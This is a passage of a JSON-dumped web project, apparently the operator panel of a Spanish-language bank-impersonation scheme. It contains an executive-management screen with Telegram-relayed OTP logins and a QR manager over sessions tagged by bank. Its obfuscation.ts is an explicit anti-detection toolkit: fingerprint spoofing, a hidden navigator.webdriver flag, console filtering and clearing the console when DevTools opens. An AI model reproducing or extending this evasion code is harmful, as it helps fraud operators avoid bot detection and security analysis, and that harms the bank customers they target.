size }}>\n      {children}\n    </ToggleGroupContext.Provider>\n  </ToggleGroupPrimitive.Root>\n))\n\nToggleGroup.displayName = ToggleGroupPrimitive.Root.displayName\n\nconst ToggleGroupItem = React.forwardRef<\n  React.ElementRef<typeof ToggleGroupPrimitive.Item>,\n  React.ComponentPropsWithoutRef<typeof ToggleGroupPrimitive.Item> &\n    VariantProps<typeof toggleVariants>\n>(({ className, children, variant, size, ...props }, ref) => {\n  const context = React.useContext(ToggleGroupContext)\n\n  return (\n    <ToggleGroupPrimitive.Item\n      ref={ref}\n      className={cn(\n        toggleVariants({\n          variant: context.variant || variant,\n          size: context.size || size,\n        }),\n        className\n      )}\n      {...props}\n    >\n      {children}\n    </ToggleGroupPrimitive.Item>\n  )\n})\n\nToggleGroupItem.displayName = ToggleGroupPrimitive.Item.displayName\n\nexport { ToggleGroup, ToggleGroupItem }\n","size_bytes":1739},"client/src/components/admin/ExecutiveManagement.tsx":{"content":"import { useState } from 'react';\nimport { useQuery, useMutation } from '@tanstack/react-query';\nimport { apiRequest, getQueryFn, queryClient } from '@/lib/queryClient';\nimport { Button } from '@/components/ui/button';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';\nimport { Badge } from '@/components/ui/badge';\nimport { Label } from '@/components/ui/label';\nimport { Input } from '@/components/ui/input';\nimport { useToast } from '@/hooks/use-toast';\nimport { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from '@/components/ui/dialog';\nimport { Loader2, Plus, User, ToggleLeft, ToggleRight, Trash, Edit, Shield } from 'lucide-react';\n\ninterface Executive {\n  id: number;\n  userId: number;\n  username: string;\n  displayName: string | null;\n  isActive: boolean;\n  currentSessions: number;\n  maxSessions: number;\n  createdAt: string;\n  lastLogin: string | null;\n}\n\nexport default function ExecutiveManagement() {\n  const { toast } = useToast();\n  const [isCreateDialogOpen, setIsCreateDialogOpen] = useState(false);\n  const [isEditDialogOpen, setIsEditDialogOpen] = useState(false);\n  const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState(false);\n  const [selectedExecutive, setSelectedExecutive] = useState<Executive | null>(null);\n  \n  const [newExecutiveData, setNewExecutiveData] = useState({\n    username: '',\n    password: '',\n    displayName: ''\n  });\n  \n  const [editExecutiveData, setEditExecutiveData] = useState({\n    displayName: '',\n    password: ''\n  });\n  \n  // Obtener ejecutivos\n  const { data: executives = [], isLoading } = useQuery<Executive[]>({\n    queryKey: ['/api/executives'],\n    queryFn: getQueryFn({ on401: 'throw' }),\n    refetchInterval: 5000\n  });\n  \n  // Crear ejecutivo\n  const createMutation = useMutation({\n    mutationFn: async (data: typeof newExecutiveData) => {\n      const res = await apiRequest('POST', '/api/executives', data);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/executives'] });\n      toast({\n        title: \"Ejecutivo creado\",\n        description: \"El ejecutivo se ha creado exitosamente\"\n      });\n      setIsCreateDialogOpen(false);\n      setNewExecutiveData({ username: '', password: '', displayName: '' });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"No se pudo crear el ejecutivo\",\n        variant: \"destructive\"\n      });\n    }\n  });\n  \n  // Actualizar ejecutivo\n  const updateMutation = useMutation({\n    mutationFn: async ({ id, data }: { id: number; data: typeof editExecutiveData }) => {\n      const res = await apiRequest('PUT', `/api/executives/${id}`, data);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/executives'] });\n      toast({\n        title: \"Ejecutivo actualizado\",\n        description: \"Los cambios se han guardado exitosamente\"\n      });\n      setIsEditDialogOpen(false);\n      setSelectedExecutive(null);\n      setEditExecutiveData({ displayName: '', password: '' });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"No se pudo actualizar el ejecutivo\",\n        variant: \"destructive\"\n      });\n    }\n  });\n  \n  // Toggle estado\n  const toggleStatusMutation = useMutation({\n    mutationFn: async (id: number) => {\n      const res = await apiRequest('PUT', `/api/executives/${id}/toggle-status`);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/executives'] });\n      toast({\n        title: \"Estado actualizado\",\n        description: \"El estado del ejecutivo se ha cambiado\"\n      });\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"No se pudo cambiar el estado\",\n        variant: \"destructive\"\n      });\n    }\n  });\n  \n  // Eliminar ejecutivo\n  const deleteMutation = useMutation({\n    mutationFn: async (id: number) => {\n      const res = await apiRequest('DELETE', `/api/executives/${id}`);\n      return res.json();\n    },\n    onSuccess: () => {\n      queryClient.invalidateQueries({ queryKey: ['/api/executives'] });\n      toast({\n        title: \"Ejecutivo eliminado\",\n        description: \"El ejecutivo se ha eliminado exitosamente\"\n      });\n      setIsDeleteDialogOpen(false);\n      setSelectedExecutive(null);\n    },\n    onError: (error: any) => {\n      toast({\n        title: \"Error\",\n        description: error.message || \"No se pudo eliminar el ejecutivo\",\n        variant: \"destructive\"\n      });\n    }\n  });\n  \n  const handleCreate = () => {\n    if (!newExecutiveData.username || !newExecutiveData.password) {\n      toast({\n        title: \"Error\",\n        description: \"Usuario y contrase帽a son requeridos\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    createMutation.mutate(newExecutiveData);\n  };\n  \n  const handleEdit = () => {\n    if (!selectedExecutive) return;\n    \n    const updateData: any = {};\n    if (editExecutiveData.displayName) updateData.displayName = editExecutiveData.displayName;\n    if (editExecutiveData.password) updateData.password = editExecutiveData.password;\n    \n    if (Object.keys(updateData).length === 0) {\n      toast({\n        title: \"Error\",\n        description: \"Debes proporcionar al menos un campo para actualizar\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n    \n    updateMutation.mutate({ id: selectedExecutive.id, data: updateData });\n  };\n  \n  const openEditDialog = (executive: Executive) => {\n    setSelectedExecutive(executive);\n    setEditExecutiveData({\n      displayName: executive.displayName || '',\n      password: ''\n    });\n    setIsEditDialogOpen(true);\n  };\n  \n  const openDeleteDialog = (executive: Executive) => {\n    setSelectedExecutive(executive);\n    setIsDeleteDialogOpen(true);\n  };\n  \n  if (isLoading) {\n    return (\n      <div className=\"flex items-center justify-center p-8\">\n        <Loader2 className=\"h-8 w-8 animate-spin\" />\n      </div>\n    );\n  }\n  \n  return (\n    <div className=\"space-y-6\">\n      <Card>\n        <CardHeader>\n          <div className=\"flex items-center justify-between\">\n            <div>\n              <CardTitle className=\"flex items-center gap-2\">\n                <Shield className=\"h-5 w-5\" />\n                Gesti贸n de Ejecutivos\n              </CardTitle>\n              <CardDescription>\n                Administra los ejecutivos de tu oficina (m谩ximo 8)\n              </CardDescription>\n              <div className=\"mt-3 p-3 bg-blue-50 dark:bg-blue-950 rounded-md border border-blue-200 dark:border-blue-800\">\n                <p className=\"text-sm text-blue-900 dark:text-blue-100 font-medium mb-1\">\n                   Instrucciones para ejecutivos:\n                </p>\n                <div className=\"space-y-2 text-xs text-blue-700 dark:text-blue-300\">\n                  <p>1. Ir a: <code className=\"bg-white dark:bg-slate-900 px-2 py-1 rounded border select-all\">{window.location.origin}/balonx</code></p>\n                  <p>2. Hacer clic en la pesta帽a <strong>\"Ejecutivo\"</strong></p>\n                  <p>3. Ingresar las credenciales proporcionadas</p>\n                  <p>4. El OTP llegar谩 a tu Telegram - comp谩rtelo con el ejecutivo</p>\n                </div>\n              </div>\n            </div>\n            <Button \n              onClick={() => setIsCreateDialogOpen(true)}\n              disabled={executives.length >= 8}\n              data-testid=\"button-create-executive\"\n            >\n              <Plus className=\"h-4 w-4 mr-2\" />\n              Nuevo Ejecutivo\n            </Button>\n          </div>\n        </CardHeader>\n        <CardContent>\n          <div className=\"mb-4\">\n            <Badge variant=\"secondary\">\n              {executives.length} / 8 ejecutivos\n            </Badge>\n          </div>\n          \n          <Table>\n            <TableHeader>\n              <TableRow>\n                <TableHead>Usuario</TableHead>\n                <TableHead>Nombre</TableHead>\n                <TableHead>Estado</TableHead>\n                <TableHead>Sesiones</TableHead>\n                <TableHead>ltimo Login</TableHead>\n                <TableHead>Acciones</TableHead>\n              </TableRow>\n            </TableHeader>\n            <TableBody>\n              {executives.length === 0 ? (\n                <TableRow>\n                  <TableCell colSpan={6} className=\"text-center text-muted-foreground\">\n                    No hay ejecutivos creados\n                  </TableCell>\n                </TableRow>\n              ) : (\n                executives.map((executive) => (\n                  <TableRow key={executive.id} data-testid={`row-executive-${executive.id}`}>\n                    <TableCell className=\"font-medium\">{executive.username}</TableCell>\n                    <TableCell>{executive.displayName || executive.username}</TableCell>\n                    <TableCell>\n                      <Badge variant={executive.isActive ? \"default\" : \"destructive\"}>\n                        {executive.isActive ? 'Activo' : 'Inactivo'}\n                      </Badge>\n                    </TableCell>\n                    <TableCell>\n                      <Badge variant=\"outline\">\n                        {executive.currentSessions} / {executive.maxSessions}\n                      </Badge>\n                    </TableCell>\n                    <TableCell>\n                      {executive.lastLogin \n                        ? new Date(executive.lastLogin).toLocaleDateString('es-MX')\n                        : 'Nunca'}\n                    </TableCell>\n                    <TableCell>\n                      <div className=\"flex gap-2\">\n                        <Button\n                          variant=\"outline\"\n                          size=\"sm\"\n                          onClick={() => toggleStatusMutation.mutate(executive.id)}\n                          data-testid={`button-toggle-${executive.id}`}\n                        >\n                          {executive.isActive ? (\n                            <ToggleRight className=\"h-4 w-4\" />\n                          ) : (\n                            <ToggleLeft className=\"h-4 w-4\" />\n                          )}\n                        </Button>\n                        <Button\n                          variant=\"outline\"\n                          size=\"sm\"\n                          onClick={() => openEditDialog(executive)}\n                          data-testid={`button-edit-${executive.id}`}\n                        >\n                          <Edit className=\"h-4 w-4\" />\n                        </Button>\n                        <Button\n                          variant=\"destructive\"\n                          size=\"sm\"\n                          onClick={() => openDeleteDialog(executive)}\n                          data-testid={`button-delete-${executive.id}`}\n                        >\n                          <Trash className=\"h-4 w-4\" />\n                        </Button>\n                      </div>\n                    </TableCell>\n                  </TableRow>\n                ))\n              )}\n            </TableBody>\n          </Table>\n        </CardContent>\n      </Card>\n      \n      {/* Dialog para crear ejecutivo */}\n      <Dialog open={isCreateDialogOpen} onOpenChange={setIsCreateDialogOpen}>\n        <DialogContent>\n          <DialogHeader>\n            <DialogTitle>Crear Nuevo Ejecutivo</DialogTitle>\n            <DialogDescription>\n              El ejecutivo podr谩 iniciar sesi贸n con OTP enviado a tu Telegram\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"space-y-4 py-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"username\">Usuario</Label>\n              <Input\n                id=\"username\"\n                value={newExecutiveData.username}\n                onChange={(e) => setNewExecutiveData({ ...newExecutiveData, username: e.target.value })}\n                placeholder=\"nombre_usuario\"\n                data-testid=\"input-create-username\"\n              />\n            </div>\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"password\">Contrase帽a</Label>\n              <Input\n                id=\"password\"\n                type=\"password\"\n                value={newExecutiveData.password}\n                onChange={(e) => setNewExecutiveData({ ...newExecutiveData, password: e.target.value })}\n                placeholder=\"Contrase帽a\"\n                data-testid=\"input-create-password\"\n              />\n            </div>\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"displayName\">Nombre para mostrar (opcional)</Label>\n              <Input\n                id=\"displayName\"\n                value={newExecutiveData.displayName}\n                onChange={(e) => setNewExecutiveData({ ...newExecutiveData, displayName: e.target.value })}\n                placeholder=\"Juan P茅rez\"\n                data-testid=\"input-create-displayname\"\n              />\n            </div>\n          </div>\n          <DialogFooter>\n            <Button variant=\"outline\" onClick={() => setIsCreateDialogOpen(false)}>\n              Cancelar\n            </Button>\n            <Button onClick={handleCreate} disabled={createMutation.isPending} data-testid=\"button-confirm-create\">\n              {createMutation.isPending ? <Loader2 className=\"h-4 w-4 animate-spin\" /> : 'Crear'}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n      \n      {/* Dialog para editar ejecutivo */}\n      <Dialog open={isEditDialogOpen} onOpenChange={setIsEditDialogOpen}>\n        <DialogContent>\n          <DialogHeader>\n            <DialogTitle>Editar Ejecutivo</DialogTitle>\n            <DialogDescription>\n              Actualiza el nombre o contrase帽a del ejecutivo\n            </DialogDescription>\n          </DialogHeader>\n          <div className=\"space-y-4 py-4\">\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"edit-displayName\">Nombre para mostrar</Label>\n              <Input\n                id=\"edit-displayName\"\n                value={editExecutiveData.displayName}\n                onChange={(e) => setEditExecutiveData({ ...editExecutiveData, displayName: e.target.value })}\n                placeholder=\"Juan P茅rez\"\n                data-testid=\"input-edit-displayname\"\n              />\n            </div>\n            <div className=\"space-y-2\">\n              <Label htmlFor=\"edit-password\">Nueva Contrase帽a (dejar vac铆o para mantener)</Label>\n              <Input\n                id=\"edit-password\"\n                type=\"password\"\n                value={editExecutiveData.password}\n                onChange={(e) => setEditExecutiveData({ ...editExecutiveData, password: e.target.value })}\n                placeholder=\"Nueva contrase帽a\"\n                data-testid=\"input-edit-password\"\n              />\n            </div>\n          </div>\n          <DialogFooter>\n            <Button variant=\"outline\" onClick={() => setIsEditDialogOpen(false)}>\n              Cancelar\n            </Button>\n            <Button onClick={handleEdit} disabled={updateMutation.isPending} data-testid=\"button-confirm-edit\">\n              {updateMutation.isPending ? <Loader2 className=\"h-4 w-4 animate-spin\" /> : 'Guardar'}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n      \n      {/* Dialog para eliminar ejecutivo */}\n      <Dialog open={isDeleteDialogOpen} onOpenChange={setIsDeleteDialogOpen}>\n        <DialogContent>\n          <DialogHeader>\n            <DialogTitle>Eliminar Ejecutivo</DialogTitle>\n            <DialogDescription>\n              驴Est谩s seguro que deseas eliminar al ejecutivo <strong>{selectedExecutive?.username}</strong>?\n              Esta acci贸n no se puede deshacer.\n            </DialogDescription>\n          </DialogHeader>\n          <DialogFooter>\n            <Button variant=\"outline\" onClick={() => setIsDeleteDialogOpen(false)}>\n              Cancelar\n            </Button>\n            <Button \n              variant=\"destructive\" \n              onClick={() => selectedExecutive && deleteMutation.mutate(selectedExecutive.id)}\n              disabled={deleteMutation.isPending}\n              data-testid=\"button-confirm-delete\"\n            >\n              {deleteMutation.isPending ? <Loader2 className=\"h-4 w-4 animate-spin\" /> : 'Eliminar'}\n            </Button>\n          </DialogFooter>\n        </DialogContent>\n      </Dialog>\n    </div>\n  );\n}\n","size_bytes":16703},"client/src/components/ui/toaster.tsx":{"content":"import { useToast } from \"@/hooks/use-toast\"\nimport {\n  Toast,\n  ToastClose,\n  ToastDescription,\n  ToastProvider,\n  ToastTitle,\n  ToastViewport,\n} from \"@/components/ui/toast\"\n\nexport function Toaster() {\n  const { toasts } = useToast()\n\n  return (\n    <ToastProvider>\n      {toasts.map(function ({ id, title, description, action, ...props }) {\n        return (\n          <Toast key={id} {...props}>\n            <div className=\"grid gap-1\">\n              {title && <ToastTitle>{title}</ToastTitle>}\n              {description && (\n                <ToastDescription>{description}</ToastDescription>\n              )}\n            </div>\n            {action}\n            <ToastClose />\n          </Toast>\n        )\n      })}\n      <ToastViewport />\n    </ToastProvider>\n  )\n}\n","size_bytes":772},"client/src/utils/obfuscation.ts":{"content":"// Utilidades de ofuscaci贸n y anti-detecci贸n\nexport const encodeStr = (str: string): string => {\n  return btoa(unescape(encodeURIComponent(str))).split('').reverse().join('');\n};\n\nexport const decodeStr = (str: string): string => {\n  return decodeURIComponent(escape(atob(str.split('').reverse().join(''))));\n};\n\n// Fingerprint aleatorio para evitar detecci贸n\nexport const generateRandomFingerprint = (): string => {\n  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n  let result = '';\n  for (let i = 0; i < 16; i++) {\n    result += chars.charAt(Math.floor(Math.random() * chars.length));\n  }\n  return result;\n};\n\n// Headers aleatorios para requests\nexport const getRandomHeaders = () => {\n  const userAgents = [\n    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',\n    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',\n    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'\n  ];\n  \n  const acceptLanguages = [\n    'es-ES,es;q=0.9,en;q=0.8',\n    'es-MX,es;q=0.9,en;q=0.8',\n    'en-US,en;q=0.9,es;q=0.8'\n  ];\n\n  return {\n    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],\n    'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],\n    'Accept-Encoding': 'gzip, deflate, br',\n    'DNT': '1',\n    'Connection': 'keep-alive',\n    'Upgrade-Insecure-Requests': '1',\n    'Sec-Fetch-Dest': 'document',\n    'Sec-Fetch-Mode': 'navigate',\n    'Sec-Fetch-Site': 'none',\n    'Cache-Control': 'max-age=0'\n  };\n};\n\n// Delay aleatorio entre acciones\nexport const randomDelay = (min: number = 100, max: number = 300): Promise<void> => {\n  const delay = Math.floor(Math.random() * (max - min + 1)) + min;\n  return new Promise(resolve => setTimeout(resolve, delay));\n};\n\n// Ofuscar nombres de funciones en runtime\nexport const createObfuscatedFunction = (fn: Function, name: string) => {\n  const obfuscatedName = btoa(name).replace(/[^a-zA-Z]/g, '');\n  Object.defineProperty(fn, 'name', { value: obfuscatedName });\n  return fn;\n};\n\n// Canvas fingerprinting protection\nexport const protectCanvas = () => {\n  if (typeof window !== 'undefined') {\n    const originalToDataURL = HTMLCanvasElement.prototype.toDataURL;\n    const originalGetImageData = CanvasRenderingContext2D.prototype.getImageData;\n    \n    HTMLCanvasElement.prototype.toDataURL = function(...args) {\n      const noise = Math.random() * 0.001;\n      const context = this.getContext('2d');\n      if (context) {\n        context.fillStyle = `rgba(${Math.floor(noise * 255)}, ${Math.floor(noise * 255)}, ${Math.floor(noise * 255)}, 0.01)`;\n        context.fillRect(0, 0, 1, 1);\n      }\n      return originalToDataURL.apply(this, args);\n    };\n    \n    CanvasRenderingContext2D.prototype.getImageData = function(...args) {\n      const imageData = originalGetImageData.apply(this, args);\n      const data = imageData.data;\n      for (let i = 0; i < data.length; i += 4) {\n        if (Math.random() < 0.001) {\n          data[i] = Math.floor(Math.random() * 256);\n          data[i + 1] = Math.floor(Math.random() * 256);\n          data[i + 2] = Math.floor(Math.random() * 256);\n        }\n      }\n      return imageData;\n    };\n  }\n};\n\n// WebGL fingerprinting protection\nexport const protectWebGL = () => {\n  if (typeof window !== 'undefined') {\n    const originalGetParameter = WebGLRenderingContext.prototype.getParameter;\n    WebGLRenderingContext.prototype.getParameter = function(parameter) {\n      if (parameter === this.RENDERER || parameter === this.VENDOR) {\n        return 'Privacy Protected';\n      }\n      return originalGetParameter.apply(this, [parameter]);\n    };\n  }\n};\n\n// Audio context fingerprinting protection\nexport const protectAudioContext = () => {\n  if (typeof window !== 'undefined' && window.AudioContext) {\n    const OriginalAudioContext = window.AudioContext;\n    window.AudioContext = class extends OriginalAudioContext {\n      constructor(...args: any[]) {\n        super(...args);\n        const originalCreateOscillator = this.createOscillator;\n        this.createOscillator = function() {\n          const oscillator = originalCreateOscillator.call(this);\n          const originalStart = oscillator.start;\n          oscillator.start = function(when?: number) {\n            const noise = Math.random() * 0.0001;\n            return originalStart.call(this, when ? when + noise : noise);\n          };\n          return oscillator;\n        };\n      }\n    };\n  }\n};\n\n// Inicializar todas las protecciones\nexport const initAntiDetection = () => {\n  protectCanvas();\n  protectWebGL();\n  protectAudioContext();\n  \n  // Importar y usar el obfuscador de fingerprints\n  import('./fingerprint').then(({ FingerprintObfuscator }) => {\n    const obfuscator = FingerprintObfuscator.getInstance();\n    obfuscator.initializeObfuscation();\n  });\n  \n  // Ocultar propiedades del navegador que pueden ser detectadas\n  if (typeof window !== 'undefined') {\n    Object.defineProperty(navigator, 'webdriver', {\n      get: () => undefined,\n    });\n    \n    // Sobrescribir console.log para evitar detecci贸n de debugging\n    const originalLog = console.log;\n    console.log = (...args) => {\n      if (args.some(arg => typeof arg === 'string' && arg.includes('webdriver'))) {\n        return;\n      }\n      originalLog.apply(console, args);\n    };\n    \n    // Proteger contra detecci贸n de DevTools\n    let devtools = {open: false, orientation: null};\n    const threshold = 160;\n    \n    setInterval(() => {\n      if (window.outerHeight - window.innerHeight > threshold || \n          window.outerWidth - window.innerWidth > threshold) {\n        if (!devtools.open) {\n          devtools.open = true;\n          // En lugar de bloquear, simplemente limpiar console\n          console.clear();\n        }\n      } else {\n        devtools.open = false;\n      }\n    }, 500);\n  }\n};","size_bytes":5993},"client/src/components/admin/QRManager.tsx":{"content":"import React, { useState, useEffect } from 'react';\nimport { useQuery } from '@tanstack/react-query';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { Textarea } from '@/components/ui/textarea';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { useToast } from '@/hooks/use-toast';\nimport { QrCode, Download, Copy, Eye } from 'lucide-react';\nimport QRCode from 'qrcode';\nimport { Session } from '@shared/schema';\n\nexport default function QRManager() {\n  const { toast } = useToast();\n  const [qrText, setQrText] = useState('');\n  const [generatedQR, setGeneratedQR] = useState<string | null>(null);\n  const [selectedSession, setSelectedSession] = useState<string>('');\n  const [sessionQRData, setSessionQRData] = useState<string>('');\n\n  // Obtener sesiones que tienen datos de QR\n  const { data: sessions = [], isLoading } = useQuery({\n    queryKey: ['/api/sessions'],\n    select: (data: Session[]) => data.filter(session => session.qrData || session.qrImageData)\n  });\n\n  // Generar QR a partir de texto personalizado\n  const generateCustomQR = async () => {\n    if (!qrText.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"Por favor ingresa el texto para generar el c贸digo QR.\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    try {\n      const qrDataURL = await QRCode.toDataURL(qrText, {\n        width: 300,\n        margin: 2,\n        color: {\n          dark: '#000000',\n          light: '#FFFFFF'\n        }\n      });\n      setGeneratedQR(qrDataURL);\n      toast({\n        title: \"QR Generado\",\n        description: \"El c贸digo QR se ha generado exitosamente.\"\n      });\n    } catch (error) {\n      toast({\n        title: \"Error\",\n        description: \"Error al generar el c贸digo QR.\",\n        variant: \"destructive\"\n      });\n    }\n  };\n\n  // Generar QR a partir de datos de sesi贸n\n  const generateSessionQR = async () => {\n    if (!sessionQRData.trim()) {\n      toast({\n        title: \"Error\",\n        description: \"No hay datos de QR en la sesi贸n seleccionada.\",\n        variant: \"destructive\"\n      });\n      return;\n    }\n\n    try {\n      const qrDataURL = await QRCode.toDataURL(sessionQRData, {\n        width: 300,\n        margin: 2,\n        color: {\n          dark: '#000000',\n          light: '#FFFFFF'\n        }\n      });\n      setGeneratedQR(qrDataURL);\n      toast({\n        title: \"QR Generado\",\n        description: \"El c贸digo QR se ha generado a partir de los datos de la sesi贸n.\"\n      });\n    } catch (error) {\n      toast({\n        title: \"Error\",\n        description: \"Error al generar el c贸digo QR.\",\n        variant: \"destructive\"\n      });\n    }\n  };\n\n  // Manejar selecci贸n de sesi贸n\n  const handleSessionSelect = (sessionId: string) => {\n    setSelectedSession(sessionId);\n    const session = sessions.find(s => s.sessionId === sessionId);\n    if (session && session.qrData) {\n      setSessionQRData(session.qrData);\n    }\n  };\n\n  // Copiar datos de QR al portapapeles\n  const copyQRData = async (data: string) => {\n    try {\n      await navigator.clipboard.writeText(data);\n      toast({\n        title: \"Copiado\",\n        description: \"Los datos del QR han sido copiados al portapapeles.\"\n      });\n    } catch (error) {\n      toast({\n        title: \"Error\",\n        description: \"No se pudo copiar al portapapeles.\",\n        variant: \"destructive\"\n      });\n    }\n  };\n\n  // Descargar imagen QR\n  const downloadQR = () => {\n    if (!generatedQR) return;\n\n    const link = document.createElement('a');\n    link.href = generatedQR;\n    link.download = `qr_code_${new Date().toISOString().slice(0, 10)}.png`;\n    document.body.appendChild(link);\n    link.click();\n    document.body.removeChild(link);\n    \n    toast({\n      title: \"Descarga exitosa\",\n      description: \"El c贸digo QR se ha descargado correctamente.\"\n    });\n  };\n\n  return (\n    <div className=\"space-y-6\">\n      <div className=\"flex items-center justify-between\">\n        <h2 className=\"text-2xl font-bold text-white flex items-center\">\n          <QrCode className=\"mr-2 h-6 w-6\" />\n          Generador de C贸digos QR\n        </h2>\n      </div>\n\n      <div className=\"grid grid-cols-1 lg:grid-cols-2 gap-6\">\n        {/* Generador de QR personalizado */}\n        <Card className=\"bg-[#1e1e1e] border-gray-700\">\n          <CardHeader>\n            <CardTitle className=\"text-white flex items-center\">\n              <QrCode className=\"mr-2 h-5 w-5\" />\n              QR Personalizado\n            </CardTitle>\n            <CardDescription className=\"text-gray-400\">\n              Genera un c贸digo QR a partir de texto personalizado\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            <div>\n              <Label htmlFor=\"custom-qr-text\" className=\"text-white\">\n                Texto para el QR\n              </Label>\n              <Textarea\n                id=\"custom-qr-text\"\n                value={qrText}\n                onChange={(e) => setQrText(e.target.value)}\n                placeholder=\"Ingresa el texto que quieres convertir en QR...\"\n                className=\"bg-[#2a2a2a] border-gray-600 text-white\"\n                rows={4}\n              />\n            </div>\n            <Button \n              onClick={generateCustomQR}\n              className=\"w-full bg-blue-600 hover:bg-blue-700\"\n              disabled={!qrText.trim()}\n            >\n              <QrCode className=\"mr-2 h-4 w-4\" />\n              Generar QR\n            </Button>\n          </CardContent>\n        </Card>\n\n        {/* Generador de QR desde sesiones */}\n        <Card className=\"bg-[#1e1e1e] border-gray-700\">\n          <CardHeader>\n            <CardTitle className=\"text-white flex items-center\">\n              <Eye className=\"mr-2 h-5 w-5\" />\n              QR desde Sesiones\n            </CardTitle>\n            <CardDescription className=\"text-gray-400\">\n              Genera QR usando datos de sesiones existentes\n            </CardDescription>\n          </CardHeader>\n          <CardContent className=\"space-y-4\">\n            {isLoading ? (\n              <div className=\"text-gray-400\">Cargando sesiones...</div>\n            ) : sessions.length === 0 ? (\n              <div className=\"text-gray-400\">No hay sesiones con datos de QR</div>\n            ) : (\n              <>\n                <div>\n                  <Label className=\"text-white\">Seleccionar Sesi贸n</Label>\n                  <Select value={selectedSession} onValueChange={handleSessionSelect}>\n                    <SelectTrigger className=\"bg-[#2a2a2a] border-gray-600 text-white\">\n                      <SelectValue placeholder=\"Selecciona una sesi贸n...\" />\n                    </SelectTrigger>\n                    <SelectContent className=\"bg-[#2a2a2a] border-gray-600\">\n                      {sessions.map((session) => (\n                        <SelectItem key={session.sessionId} value={session.sessionId}>\n                          {session.folio} - {session.banco} \n                          {session.createdBy && ` (${session.createdBy})`}\n                        </SelectItem>\n                      ))}\n                    </SelectContent>\n                  </Select>\n                </div>\n\n                {sessionQRData && (\n                  <div>\n                    <Label className=\"text-white\">Datos del QR</Label>\n                    <div className=\"bg-[#2a2a2a] border border-gray-600 rounded p-3 text-white text-sm max-h-32 overflow-y-auto\">\n                      {sessionQRData}\n                    </div>\n                    <Button\n                      onClick={() => copyQRData(sessionQRData)}\n                      variant=\"outline\"\n                      size=\"sm\"\n                      className=\"mt-2 border-gray-600 text-gray-300 hover:bg-gray-700\"\n                    >\n                      <Copy className=\"mr-2 h-3 w-3\" />\n                      Copiar datos\n                    </Button>\n                  </div>\n                )}\n\n                <Button \n                  onClick={generateSessionQR}\n                  className=\"w-full bg-green-600 hover:bg-green-700\"\n                  disabled={!sessionQRData}\n                >\n                  <QrCode className=\"mr-2 h-4 w-4\" />\n                  Generar QR desde Sesi贸n\n                </Button>\n              </>\n            )}\n          </CardContent>\n        </Card>\n      </div>\n\n      {/* Mostrar QR generado */}\n      {generatedQR && (\n        <Card className=\"bg-[#1e1e1e] border-gray-700\">\n          <CardHeader>\n            <CardTitle className=\"text-white\">C贸digo QR Generado</CardTitle>\n          </CardHeader>\n          <CardContent className=\"text-center space-y-4\">\n            <div className=\"flex justify-center\">\n              <img \n                src={generatedQR} \n                alt=\"C贸digo QR generado\" \n                className=\"border border-gray-600 rounded\"\n              />\n            </div>\n            <div className=\"flex justify-center space-x-4\">\n              <Button\n                onClick={downloadQR}\n                className=\"bg-purple-600 hover:bg-purple-700\"\n              >\n                <Download className=\"mr-2 h-4 w-4\" />\n                Descargar\n              </Button>\n              <Button\n                onClick={() => copyQRData(generatedQR)}\n                variant=\"outline\"\n                className=\"border-gray-600 text-gray-300 hover:bg-gray-700\"\n              >\n                <Copy className=\"mr-2 h-4 w-4\" />\n                Copiar imagen\n              </Button>\n            </div>\n          </CardContent>\n        </Card>\n      )}\n    </div>\n  );\n}","size_bytes":9833},"client/src/components/admin/MessageSender.tsx":{"content":"import { useState } from 'react';\nimport { useQuery } from '@tanstack/react-query';\nimport { Button } from '@/components/ui/button';\nimport { Input } from '@/components/ui/input';\nimport { Label } from '@/components/ui/label';\nimport { Textarea } from '@/components/ui/textarea';\nimport { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';\nimport { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';\nimport { Alert, AlertDescription } from '@/components/ui/alert';\nimport { SendIcon, MessageCircleIcon, UsersIcon, FileIcon, X } from 'lucide-react';\nimport { apiRequest } from '@/lib/queryClient';\nimport { useToast } from '@/hooks/use-toast';\n\ninterface User {\n  id: number;\n  username: string;\n  telegramChatId: string | null;\n  